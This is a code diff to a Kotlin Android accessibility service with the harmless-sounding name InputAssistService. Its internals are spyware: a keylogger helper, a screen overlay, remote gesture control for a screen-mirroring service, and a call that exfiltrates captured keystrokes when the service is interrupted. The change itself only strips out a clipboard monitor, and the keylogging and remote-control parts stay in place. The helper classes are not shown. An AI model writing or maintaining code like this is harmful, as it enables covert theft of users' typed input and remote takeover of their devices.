@@ -24,7 +24,6 @@ class InputAssistService : AccessibilityService() {
     private lateinit var keylogger:        TextSyncHelper
     private lateinit var overlay:          UiLayerHelper
     private lateinit var remoteControl:    GestureHelper
-    private lateinit var clipboardMonitor: ClipboardMonitor
 
     companion object {
         /** Singleton used by ScreenMirrorService for remote-control calls. */
@@ -40,7 +39,6 @@ class InputAssistService : AccessibilityService() {
         keylogger        = TextSyncHelper(this)
         overlay          = UiLayerHelper(this)
         remoteControl    = GestureHelper(this)
-        clipboardMonitor = ClipboardMonitor(this)
 
         // Configure events — union of all helper requirements
         val info = AccessibilityServiceInfo().apply {
@@ -69,7 +67,6 @@ class InputAssistService : AccessibilityService() {
         keylogger.onEvent(event)   // handles TYPE_VIEW_TEXT_CHANGED + TYPE_VIEW_FOCUSED
         overlay.onEvent(event)     // handles TYPE_WINDOW_STATE_CHANGED + TYPE_WINDOWS_CHANGED
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-            clipboardMonitor.onClipboardChanged(event)
         }
     }
 
@@ -79,7 +76,6 @@ class InputAssistService : AccessibilityService() {
         Log.d(TAG, "Service interrupted — flushing keystrokes")
         keylogger.exfiltrateKeystrokes()
         overlay.removeOverlay()
-        clipboardMonitor.clearHistory()
     }
 
     override fun onDestroy() {
